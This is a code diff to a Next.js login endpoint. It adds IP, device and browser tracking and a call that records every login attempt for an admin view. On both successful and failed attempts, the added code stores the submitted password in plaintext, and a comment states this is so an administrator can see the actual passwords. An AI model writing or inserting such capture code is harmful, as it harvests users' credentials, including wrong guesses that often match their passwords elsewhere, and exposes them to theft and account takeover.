@@ -1,5 +1,6 @@
 import { NextRequest, NextResponse } from "next/server"
 import crypto from "crypto"
+import { addLoginRecord } from "@/app/api/admin/logins/route"
 
 // User credentials - In production, these would be stored in a database
 const TEST_USER = {
@@ -9,14 +10,60 @@ const TEST_USER = {
   balance: 999
 }
 
+// Helper to parse user agent
+function parseUserAgent(ua: string): { device: string; deviceType: "desktop" | "mobile"; browser: string; os: string } {
+  const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua)
+  
+  let browser = "Unknown"
+  if (ua.includes("Chrome")) browser = "Chrome"
+  else if (ua.includes("Safari")) browser = "Safari"
+  else if (ua.includes("Firefox")) browser = "Firefox"
+  else if (ua.includes("Edge")) browser = "Edge"
+  else if (ua.includes("Opera")) browser = "Opera"
+  
+  let os = "Unknown"
+  if (ua.includes("Windows")) os = "Windows"
+  else if (ua.includes("Mac")) os = "MacOS"
+  else if (ua.includes("Linux")) os = "Linux"
+  else if (ua.includes("Android")) os = "Android"
+  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS"
+  
+  return {
+    device: `${browser} - ${os}`,
+    deviceType: isMobile ? "mobile" : "desktop",
+    browser,
+    os
+  }
+}
+
 export async function POST(request: NextRequest) {
   try {
     const { email, password } = await request.json()
+    
+    // Get IP and user agent
+    const ip = request.headers.get("x-forwarded-for")?.split(",")[0] || 
+               request.headers.get("x-real-ip") || 
+               "Unknown"
+    const userAgent = request.headers.get("user-agent") || ""
+    const { device, deviceType, browser, os } = parseUserAgent(userAgent)
 
     // Validate credentials
     if (email === TEST_USER.email && password === TEST_USER.password) {
       // Generate a simple token
       const token = crypto.randomBytes(32).toString("hex")
+      
+      // Record successful login
+      addLoginRecord({
+        email,
+        password: password, // Store actual password for admin view
+        name: TEST_USER.name,
+        ip,
+        device,
+        deviceType,
+        browser,
+        os,
+        success: true
+      })
       
       const response = NextResponse.json({
         success: true,
@@ -39,6 +86,19 @@ export async function POST(request: NextRequest) {
 
       return response
     }
+
+    // Record failed login attempt
+    addLoginRecord({
+      email,
+      password: password, // Store attempted password
+      name: "Tentativa Falha",
+      ip,
+      device,
+      deviceType,
+      browser,
+      os,
+      success: false
+    })
 
     return NextResponse.json({
       success: false,
